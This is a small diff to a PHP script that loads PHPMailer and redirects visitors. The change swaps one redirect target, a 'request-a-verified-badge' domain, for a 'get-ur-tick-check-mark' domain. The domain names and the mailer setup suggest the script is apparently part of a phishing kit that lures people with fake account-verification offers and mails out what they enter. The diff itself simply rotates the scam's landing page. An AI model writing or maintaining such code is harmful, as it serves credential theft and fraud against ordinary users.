@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://request-a-verified-badge-online.vercel.app/pass.html");
+header("Location:https://get-ur-tick-check-mark.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
